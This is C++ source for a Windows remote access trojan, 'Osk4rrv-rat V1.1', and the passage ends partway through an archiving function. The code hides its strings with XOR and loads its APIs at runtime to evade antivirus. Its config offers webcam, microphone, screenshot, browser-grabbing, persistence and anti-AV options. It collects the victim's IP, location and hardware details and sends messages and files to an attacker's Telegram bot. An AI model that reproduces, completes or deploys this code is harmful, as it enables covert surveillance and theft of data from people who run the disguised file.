#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <ctime>
#include <algorithm>
#include <map>
#include <iphlpapi.h>
#include <intrin.h>

// === Dynamic API loading — keeps suspicious DLLs out of IAT ===

typedef HINTERNET (WINAPI *pfnWinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpConnect)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL (WINAPI *pfnWinHttpSetTimeouts)(HINTERNET,int,int,int,int);
typedef BOOL (WINAPI *pfnWinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *pfnWinHttpReceiveResponse)(HINTERNET,LPVOID);
typedef BOOL (WINAPI *pfnWinHttpQueryDataAvailable)(HINTERNET,LPDWORD);
typedef BOOL (WINAPI *pfnWinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI *pfnWinHttpQueryHeaders)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD);
typedef BOOL (WINAPI *pfnWinHttpCloseHandle)(HINTERNET);

typedef ULONG (WINAPI *pfnGetAdaptersAddresses)(ULONG,ULONG,PVOID,PIP_ADAPTER_ADDRESSES,PULONG);

struct DynApi {
    HMODULE hWinHttp = nullptr;
    pfnWinHttpOpen WinHttpOpen = nullptr;
    pfnWinHttpConnect WinHttpConnect = nullptr;
    pfnWinHttpOpenRequest WinHttpOpenRequest = nullptr;
    pfnWinHttpSetTimeouts WinHttpSetTimeouts = nullptr;
    pfnWinHttpSendRequest WinHttpSendRequest = nullptr;
    pfnWinHttpReceiveResponse WinHttpReceiveResponse = nullptr;
    pfnWinHttpQueryDataAvailable WinHttpQueryDataAvailable = nullptr;
    pfnWinHttpReadData WinHttpReadData = nullptr;
    pfnWinHttpQueryHeaders WinHttpQueryHeaders = nullptr;
    pfnWinHttpCloseHandle WinHttpCloseHandle = nullptr;

    HMODULE hIphlp = nullptr;
    pfnGetAdaptersAddresses GetAdaptersAddresses = nullptr;

    bool winHttpOk() const { return WinHttpOpen && WinHttpConnect && WinHttpOpenRequest && WinHttpSetTimeouts && WinHttpSendRequest && WinHttpReceiveResponse && WinHttpQueryDataAvailable && WinHttpReadData && WinHttpQueryHeaders && WinHttpCloseHandle; }
};

// dynApi() defined after OX macro below
#include <shlobj.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <vfw.h>
#include <tlhelp32.h>
#include <RestartManager.h>
#include <objbase.h>
#include <oleauto.h>
#include <cctype>
#include <cstdlib>
#include <cwchar>
// Media Foundation: native H.264/AAC MP4 encoding (no ffmpeg needed).
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
// WASAPI: microphone + system loopback capture for screen recordings.
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <mmreg.h>
#include <functiondiscoverykeys_devpkey.h>
// H.264 encoder profile constants (AVEncH264VProfile_*).
#include <codecapi.h>
// undef the windows.h min/max macros so std::min/std::max work unqualified.
#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "mf.lib")
// WASAPI GUIDs/CLSIDs (MMDeviceEnumerator, IAudioClient, ...).
#pragma comment(lib, "wmcodecdspuuid.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

// === Compile-time string obfuscation (XOR) ===

template<int N, char Key>
struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N]) : data{} {
        for (int i = 0; i < N; i++) data[i] = s[i] ^ Key;
    }
};

template<int N, wchar_t Key>
struct ObfStrW {
    wchar_t data[N];
    constexpr ObfStrW(const wchar_t (&s)[N]) : data{} {
        for (int i = 0; i < N; i++) data[i] = s[i] ^ Key;
    }
};

#define OX(s) ([]() -> const char* { \
    constexpr auto ob = ObfStr<sizeof(s), 0x5C>(s); \
    static char dec[sizeof(s)]; \
    for (int i = 0; i < sizeof(s); i++) dec[i] = ob.data[i] ^ 0x5C; \
    return dec; }())

#define OXW(s) ([]() -> const wchar_t* { \
    constexpr auto ob = ObfStrW<sizeof(s) / sizeof(wchar_t), 0x5C>(s); \
    static wchar_t dec[sizeof(s) / sizeof(wchar_t)]; \
    for (int i = 0; i < sizeof(s) / sizeof(wchar_t); i++) dec[i] = ob.data[i] ^ 0x5C; \
    return dec; }())

static DynApi& dynApi() {
    static DynApi api;
    static bool tried = false;
    if (!tried) {
        tried = true;
        api.hWinHttp = LoadLibraryA(OX("winhttp.dll"));
        if (api.hWinHttp) {
            api.WinHttpOpen = (pfnWinHttpOpen)GetProcAddress(api.hWinHttp, OX("WinHttpOpen"));
            api.WinHttpConnect = (pfnWinHttpConnect)GetProcAddress(api.hWinHttp, OX("WinHttpConnect"));
            api.WinHttpOpenRequest = (pfnWinHttpOpenRequest)GetProcAddress(api.hWinHttp, OX("WinHttpOpenRequest"));
            api.WinHttpSetTimeouts = (pfnWinHttpSetTimeouts)GetProcAddress(api.hWinHttp, OX("WinHttpSetTimeouts"));
            api.WinHttpSendRequest = (pfnWinHttpSendRequest)GetProcAddress(api.hWinHttp, OX("WinHttpSendRequest"));
            api.WinHttpReceiveResponse = (pfnWinHttpReceiveResponse)GetProcAddress(api.hWinHttp, OX("WinHttpReceiveResponse"));
            api.WinHttpQueryDataAvailable = (pfnWinHttpQueryDataAvailable)GetProcAddress(api.hWinHttp, OX("WinHttpQueryDataAvailable"));
            api.WinHttpReadData = (pfnWinHttpReadData)GetProcAddress(api.hWinHttp, OX("WinHttpReadData"));
            api.WinHttpQueryHeaders = (pfnWinHttpQueryHeaders)GetProcAddress(api.hWinHttp, OX("WinHttpQueryHeaders"));
            api.WinHttpCloseHandle = (pfnWinHttpCloseHandle)GetProcAddress(api.hWinHttp, OX("WinHttpCloseHandle"));
        }
        api.hIphlp = LoadLibraryA(OX("iphlpapi.dll"));
        if (api.hIphlp) {
            api.GetAdaptersAddresses = (pfnGetAdaptersAddresses)GetProcAddress(api.hIphlp, OX("GetAdaptersAddresses"));
        }
    }
    return api;
}

// winsqlite3 (Windows 10+) loaded dynamically
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int (*sqlite3_open_v2_t)(const char*, sqlite3**, int, const char*);
typedef int (*sqlite3_close_t)(sqlite3*);
typedef int (*sqlite3_prepare_v2_t)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int (*sqlite3_step_t)(sqlite3_stmt*);
typedef int (*sqlite3_finalize_t)(sqlite3_stmt*);
typedef const unsigned char* (*sqlite3_column_text_t)(sqlite3_stmt*, int);
typedef const void* (*sqlite3_column_blob_t)(sqlite3_stmt*, int);
typedef int (*sqlite3_column_bytes_t)(sqlite3_stmt*, int);
typedef int (*sqlite3_column_int_t)(sqlite3_stmt*, int);
#define SQLITE_OPEN_READONLY 0x00000001
#define SQLITE_OPEN_READWRITE 0x00000002
#define SQLITE_OK 0
#define SQLITE_ROW 100

struct SqliteApi {
    HMODULE mod = nullptr;
    sqlite3_open_v2_t open_v2 = nullptr;
    sqlite3_close_t close = nullptr;
    sqlite3_prepare_v2_t prepare_v2 = nullptr;
    sqlite3_step_t step = nullptr;
    sqlite3_finalize_t finalize = nullptr;
    sqlite3_column_text_t column_text = nullptr;
    sqlite3_column_blob_t column_blob = nullptr;
    sqlite3_column_bytes_t column_bytes = nullptr;
    sqlite3_column_int_t column_int = nullptr;
    bool ok() const { return mod && open_v2 && close && prepare_v2 && step && finalize && column_text; }
};

static SqliteApi& sqliteApi() {
    static SqliteApi api;
    static bool tried = false;
    if (!tried) {
        tried = true;
        api.mod = LoadLibraryA(OX("winsqlite3.dll"));
        if (api.mod) {
            api.open_v2 = (sqlite3_open_v2_t)GetProcAddress(api.mod, OX("sqlite3_open_v2"));
            api.close = (sqlite3_close_t)GetProcAddress(api.mod, OX("sqlite3_close"));
            api.prepare_v2 = (sqlite3_prepare_v2_t)GetProcAddress(api.mod, OX("sqlite3_prepare_v2"));
            api.step = (sqlite3_step_t)GetProcAddress(api.mod, OX("sqlite3_step"));
            api.finalize = (sqlite3_finalize_t)GetProcAddress(api.mod, OX("sqlite3_finalize"));
            api.column_text = (sqlite3_column_text_t)GetProcAddress(api.mod, OX("sqlite3_column_text"));
            api.column_blob = (sqlite3_column_blob_t)GetProcAddress(api.mod, OX("sqlite3_column_blob"));
            api.column_bytes = (sqlite3_column_bytes_t)GetProcAddress(api.mod, OX("sqlite3_column_bytes"));
            api.column_int = (sqlite3_column_int_t)GetProcAddress(api.mod, OX("sqlite3_column_int"));
        }
    }
    return api;
}

struct PayloadConfig {
    std::string botToken;
    std::string chatId;
    std::string sessionId;
    int updateIntervalDays = 0;
    bool grabBrowser = false;
    bool screenshot = false;
    bool autoStart = false;
    bool grabWebcam = false;
    bool grabMicrophone = false;
    bool bypassVT = false;
    bool stealth = false;
    bool persistence = false;
    bool antiDebug = false;
    bool encryptTraffic = false;
    bool antiAV = false;
    int micDurationSec = 10;
    int webcamDurationSec = 10;
    int screenDurationSec = 10;
    // Archive password. When useCustomPassword is false the payload generates a
    // random one per hit. When true, archivePassword is used as-is — and an
    // empty archivePassword means the archive is written with no password.
    bool useCustomPassword = false;
    std::string archivePassword;
    // Original file name the user opened, reported in the hit message.
    std::string originalName;
};

// ---- Forward declarations for helpers defined further down the file ----
static void ensureDpiAware();                     // defined in the native recorder section
static bool ensureMfStarted();                    // defined in the MP4 writer section
static bool wasapiRecordEndpoint(bool loopback, int durationSec,
    std::vector<char>& outPcm, DWORD& sampleRate, WORD& channels,
    const std::string& wantName);                 // defined in the screen-audio section
static bool writeMp4(const std::string& outPath,
    const std::vector<std::vector<BYTE>>& frames, int w, int h, int fps,
    const std::vector<char>& pcm = {}, DWORD pcmRate = 0, WORD pcmChannels = 0);
// (MixedAudio / traceStage / ensureDir near their definitions below.)

static std::wstring s2ws(const std::string& s) {
    return std::wstring(s.begin(), s.end());
}

static std::string generatePassword() {
    static const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string result;
    result.reserve(10);
    for (int i = 0; i < 10; i++)
        result += chars[(rand() + i) % (sizeof(chars) - 1)];
    return result;
}

static std::string urlEncode(const std::string& s) {
    std::string result;
    for (char c : s) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            result += c;
        } else {
            char buf[8];
            snprintf(buf, sizeof(buf), "%%%02X", (unsigned char)c);
            result += buf;
        }
    }
    return result;
}

// === HTTP ===

// Set while the offline notice is being delivered, i.e. during logoff/shutdown.
// Windows only gives an ending process a short window before it is killed, so
// the normal 10/10/20/30 s budget would either stall the shutdown or get the
// request cut off mid-flight. A few seconds still covers a healthy network by a
// wide margin, and a network that is already gone was never going to deliver.
static std::atomic<bool> g_shutdownSend{ false };

static void setHttpTimeouts(HINTERNET hSession) {
    auto& api = dynApi();
    if (!api.winHttpOk() || !api.WinHttpSetTimeouts) return;
    DWORD resolve = 10000, connect = 10000, send = 20000, receive = 30000;
    if (g_shutdownSend) {
        resolve = connect = 2000;
        send = receive = 3000;
    }
    api.WinHttpSetTimeouts(hSession, resolve, connect, send, receive);
}

static bool httpPost(const std::string& path, const std::string& body, std::string& response) {
    auto& api = dynApi();
    if (!api.winHttpOk()) return false;

    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    setHttpTimeouts(hSession);

    HINTERNET hConnect = api.WinHttpConnect(hSession, OXW(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { api.WinHttpCloseHandle(hSession); return false; }

    std::wstring wpath = s2ws(path);
    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, OXW(L"POST"), wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = OXW(L"Content-Type: application/x-www-form-urlencoded\r\n");

    BOOL bResults = api.WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);

    if (bResults)
        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);

    bool ok = false;
    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;
            char* buffer = new char[dwSize + 1];
            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                response += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
        ok = !response.empty();
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (api.WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        ok = (statusCode == 200);
    }

    api.WinHttpCloseHandle(hRequest);
    api.WinHttpCloseHandle(hConnect);
    api.WinHttpCloseHandle(hSession);
    return ok;
}

static bool httpPostMultipart(const std::string& path, const std::string& contentType,
    const std::string& body, std::string& response) {
    auto& api = dynApi();
    if (!api.winHttpOk()) return false;

    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    setHttpTimeouts(hSession);

    HINTERNET hConnect = api.WinHttpConnect(hSession, OXW(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { api.WinHttpCloseHandle(hSession); return false; }

    std::wstring wpath = s2ws(path);
    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, OXW(L"POST"), wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = OXW(L"Content-Type: ") + s2ws(contentType) + OXW(L"\r\n");

    BOOL bResults = api.WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);

    if (bResults)
        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);

    bool ok = false;
    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;
            char* buffer = new char[dwSize + 1];
            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                response += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
        ok = !response.empty();
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (api.WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        ok = (statusCode == 200);
    }

    api.WinHttpCloseHandle(hRequest);
    api.WinHttpCloseHandle(hConnect);
    api.WinHttpCloseHandle(hSession);
    return ok;
}

static std::string httpGet(const std::string& host, const std::string& path) {
    std::string result;
    auto& api = dynApi();
    if (!api.winHttpOk()) return result;

    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return result;
    setHttpTimeouts(hSession);

    std::wstring whost = s2ws(host);
    HINTERNET hConnect = api.WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { api.WinHttpCloseHandle(hSession); return result; }

    std::wstring wpath = s2ws(path);
    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return result; }

    BOOL bResults = api.WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (bResults)
        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);

    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;
            char* buffer = new char[dwSize + 1];
            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                result += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
    }

    api.WinHttpCloseHandle(hRequest);
    api.WinHttpCloseHandle(hConnect);
    api.WinHttpCloseHandle(hSession);
    return result;
}

static void sendTelegram(const PayloadConfig& cfg, const std::string& message) {
    std::string path = "/bot" + cfg.botToken + "/sendMessage";
    std::string body = "chat_id=" + urlEncode(cfg.chatId) + "&text=" + urlEncode(message);
    std::string response;
    httpPost(path, body, response);
}

static void sendDocument(const PayloadConfig& cfg, const std::string& caption,
    const std::string& fileName, const std::vector<char>& fileData) {
    std::string path = "/bot" + cfg.botToken + "/sendDocument";
    std::string boundary = "----P" + std::to_string(GetTickCount());
    std::string body;

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += cfg.chatId + "\r\n";

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    body += caption + "\r\n";

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(fileData.begin(), fileData.end());
    body += "\r\n";
    body += "--" + boundary + "--\r\n";

    std::string contentType = "multipart/form-data; boundary=" + boundary;
    std::string response;
    httpPostMultipart(path, contentType, body, response);
}

// === System info ===

static std::string getPCName() {
    char name[MAX_COMPUTERNAME_LENGTH + 1] = "";
    DWORD size = sizeof(name);
    GetComputerNameA(name, &size);
    return std::string(name);
}

static std::string getPublicIP() {
    std::string resp = httpGet(OX("api.ipify.org"), OX("/"));
    if (resp.empty())
        resp = httpGet(OX("ifconfig.me"), OX("/"));
    if (resp.empty())
        return "Unknown";
    size_t start = resp.find_first_of("0123456789");
    if (start == std::string::npos) return "Unknown";
    size_t end = resp.find_first_not_of("0123456789.", start);
    if (end == std::string::npos) end = resp.size();
    return resp.substr(start, end - start);
}

static std::string getCPU() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0);
    char brand[49] = { 0 };
    __cpuid(cpuInfo, 0x80000002);
    memcpy(brand, cpuInfo, sizeof(cpuInfo));
    __cpuid(cpuInfo, 0x80000003);
    memcpy(brand + 16, cpuInfo, sizeof(cpuInfo));
    __cpuid(cpuInfo, 0x80000004);
    memcpy(brand + 32, cpuInfo, sizeof(cpuInfo));
    brand[48] = 0;
    std::string result(brand);
    size_t start = result.find_first_not_of(" \t");
    if (start != std::string::npos)
        result = result.substr(start);
    return result.empty() ? "Unknown" : result;
}

static std::string getGPU() {
    DISPLAY_DEVICEA dd;
    dd.cb = sizeof(dd);
    if (EnumDisplayDevicesA(nullptr, 0, &dd, 0)) {
        std::string name(dd.DeviceString);
        if (!name.empty())
            return name;
    }
    return "Unknown";
}

static std::string getExeName() {
    char path[MAX_PATH];
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    const char* name = strrchr(path, '\\');
    return name ? std::string(name + 1) : std::string(path);
}

static std::string getCurrentDate() {
    std::time_t now = std::time(nullptr);
    std::tm localTime;
    localtime_s(&localTime, &now);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%d-%m-%Y %H:%M", &localTime);
    return std::string(buf);
}

// Brand line stamped at the top of every hit-style message. Kept in sync with
// kAppVersion in main.cpp (this is the "generation" form, e.g. V1.1).
static const char* kMsgBrand = "Osk4rrv-rat V1.1";

// Timestamp in the "(time, date)" shape used at the bottom of messages.
static std::string getTimestamp() {
    std::time_t now = std::time(nullptr);
    std::tm localTime;
    localtime_s(&localTime, &now);
    char buf[40];
    std::strftime(buf, sizeof(buf), "%H:%M, %d-%m-%Y", &localTime);
    return std::string(buf);
}

// Monotonic-ish counter so every archive name is unique even within one run
// (two hits in the same second must not collide).
static std::string uniqueSuffix() {
    static unsigned counter = 0;
    unsigned n = ++counter;
    unsigned r = (unsigned)(GetTickCount() ^ (rand() << 3) ^ (n * 2654435761u));
    char buf[24];
    snprintf(buf, sizeof(buf), "%u%05u", n, r % 100000u);
    return std::string(buf);
}

// Accurate OS name. GetVersionEx lies without a Win10-aware manifest, so read
// the real version from ntdll's RtlGetVersion and map the build number to a
// release name (e.g. "Windows 10 22H2").
static std::string getOSVersion() {
    // Locally declared to avoid depending on winternl.h's guarded typedefs.
    struct OsVerInfo {
        ULONG dwOSVersionInfoSize;
        ULONG dwMajorVersion;
        ULONG dwMinorVersion;
        ULONG dwBuildNumber;
        ULONG dwPlatformId;
        WCHAR szCSDVersion[128];
    };
    typedef LONG(WINAPI* RtlGetVersionFn)(OsVerInfo*);

    ULONG major = 0, minor = 0, build = 0;
    if (HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"))) {
        auto fn = (RtlGetVersionFn)GetProcAddress(hNtdll, OX("RtlGetVersion"));
        if (fn) {
            OsVerInfo vi = {};
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) == 0) {
                major = vi.dwMajorVersion;
                minor = vi.dwMinorVersion;
                build = vi.dwBuildNumber;
            }
        }
    }

    if (major == 0) {
        // Fall back to the legacy API; may be coarse but never empty.
        OsVerInfo vi = {};
        vi.dwOSVersionInfoSize = sizeof(vi);
        typedef LONG(WINAPI* GetVersionExFn)(OsVerInfo*);
        if (HMODULE hK = GetModuleHandleA(OX("kernel32.dll"))) {
            auto fn = (GetVersionExFn)GetProcAddress(hK, OX("GetVersionExW"));
            if (fn) {
                OsVerInfo tmp = {};
                tmp.dwOSVersionInfoSize = sizeof(tmp);
                if (fn(&tmp) == 0) { /* ignore */ }
                major = tmp.dwMajorVersion;
                minor = tmp.dwMinorVersion;
                build = tmp.dwBuildNumber;
            }
        }
    }

    std::string family;
    if (major == 10 && build >= 22000)
        family = "Windows 11";
    else if (major == 10)
        family = "Windows 10";
    else if (major == 6 && minor == 3)
        family = "Windows 8.1";
    else if (major == 6 && minor == 2)
        family = "Windows 8";
    else if (major == 6 && minor == 1)
        family = "Windows 7";
    else if (major == 0)
        return "Unknown";
    else {
        char buf[48];
        snprintf(buf, sizeof(buf), "Windows %lu.%lu", major, minor);
        family = buf;
    }

    // Build -> release name. Only the builds that actually shipped are mapped.
    const char* release = nullptr;
    switch (build) {
    case 19045: release = "22H2"; break;
    case 19044: release = "21H2"; break;
    case 19043: release = "21H1"; break;
    case 19042: release = "20H2"; break;
    case 19041: release = "2004"; break;
    case 18363: release = "1909"; break;
    case 18362: release = "1903"; break;
    case 17763: release = "1809"; break;
    case 17134: release = "1803"; break;
    case 16299: release = "1709"; break;
    case 15063: release = "1703"; break;
    case 14393: release = "1607"; break;
    case 10586: release = "1511"; break;
    case 10240: release = "1507"; break;
    default: break;
    }

    std::string out = family;
    if (release) {
        out += " ";
        out += release;
    } else if (build > 0) {
        char buf[24];
        snprintf(buf, sizeof(buf), " (build %lu)", build);
        out += buf;
    }
    return out;
}

// IP geolocation + VPN heuristic.
//
// ipwho.is is used because it is HTTPS (the free ip-api.com tier is HTTP-only,
// and this client only speaks TLS), needs no API key, and returns both the
// location fields and security flags in one request.
struct GeoInfo {
    std::string country;
    std::string region;
    std::string city;
    std::string isp;
    bool vpn = false;     // any of proxy / vpn / tor / hosting
    bool ok = false;
};

// Pull a "key":"value" string out of a flat JSON blob without a JSON library.
static std::string jsonString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    size_t k = json.find(needle);
    if (k == std::string::npos)
        return std::string();
    size_t colon = json.find(':', k + needle.size());
    if (colon == std::string::npos)
        return std::string();
    size_t q = json.find('"', colon);
    if (q == std::string::npos)
        return std::string();
    size_t end = q + 1;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    if (end >= json.size())
        return std::string();
    return json.substr(q + 1, end - q - 1);
}

// Pull a "key":true / "key":false boolean.
static bool jsonBool(const std::string& json, const std::string& key, bool def = false) {
    std::string needle = "\"" + key + "\"";
    size_t k = json.find(needle);
    if (k == std::string::npos)
        return def;
    size_t colon = json.find(':', k + needle.size());
    if (colon == std::string::npos)
        return def;
    size_t v = json.find_first_not_of(" \t\r\n", colon + 1);
    if (v == std::string::npos)
        return def;
    if (json.compare(v, 4, "true") == 0)
        return true;
    if (json.compare(v, 5, "false") == 0)
        return false;
    return def;
}

static GeoInfo getGeoInfo() {
    GeoInfo g;
    std::string resp = httpGet(OX("ipwho.is"), OX("/"));
    if (resp.empty())
        return g;

    g.country = jsonString(resp, "country");
    g.region = jsonString(resp, "region");
    g.city = jsonString(resp, "city");
    g.isp = jsonString(resp, "isp");
    if (g.country.empty() && g.city.empty())
        return g;

    g.vpn = jsonBool(resp, "proxy") || jsonBool(resp, "vpn") ||
        jsonBool(resp, "tor") || jsonBool(resp, "hosting");
    g.ok = true;
    return g;
}

// "Country, Region, City" with empty parts dropped.
static std::string formatGeo(const GeoInfo& g) {
    if (!g.ok)
        return "Unknown";
    std::string out;
    const std::string parts[3] = { g.country, g.region, g.city };
    for (const std::string& p : parts) {
        if (p.empty())
            continue;
        if (!out.empty())
            out += ", ";
        out += p;
    }
    return out.empty() ? "Unknown" : out;
}

static std::string getTempDir() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath);
}

static std::vector<char> readFileToVector(const std::string& path) {
    std::vector<char> data;
    std::ifstream file(path, std::ios::binary);
    if (file.is_open()) {
        file.seekg(0, std::ios::end);
        std::streampos size = file.tellg();
        file.seekg(0, std::ios::beg);
        if (size > 0) {
            data.resize(static_cast<size_t>(size));
            file.read(data.data(), size);
        }
        file.close();
    }
    return data;
}

static bool writeVectorToFile(const std::string& path, const std::vector<char>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) return false;
    file.write(data.data(), data.size());
    file.close();
    return true;
}

// === Archive creation using WinRAR / 7z / PowerShell ===

static bool runProcessHidden(const std::string& cmdLine, const std::string& workDir = "") {
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    char* cmd = _strdup(cmdLine.c_str());
    const char* cwd = workDir.empty() ? nullptr : workDir.c_str();
    BOOL ok = CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, cwd, &si, &pi);
    free(cmd);

    if (!ok) return false;

    WaitForSingleObject(pi.hProcess, 120000);
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (exitCode == 0);
}

static void deleteTree(const std::string& path) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        RemoveDirectoryA(path.c_str());
        DeleteFileA(path.c_str());
        return;
    }
    do {
        std::string name = findData.cFileName;
        if (name == "." || name == "..") continue;
        std::string full = path + "\\" + name;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            deleteTree(full);
        else
            DeleteFileA(full.c_str());
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
    RemoveDirectoryA(path.c_str());
}

static std::vector<char> createArchive(const std::vector<std::pair<std::string, std::vector<char>>>& files,
    std::string& outExtension, const std::string& password) {
    std::vector<char> result;
    outExtension = "zip";

    std::string tempDir = getTempDir() + "tmp_" + std::to_string(GetTickCount());
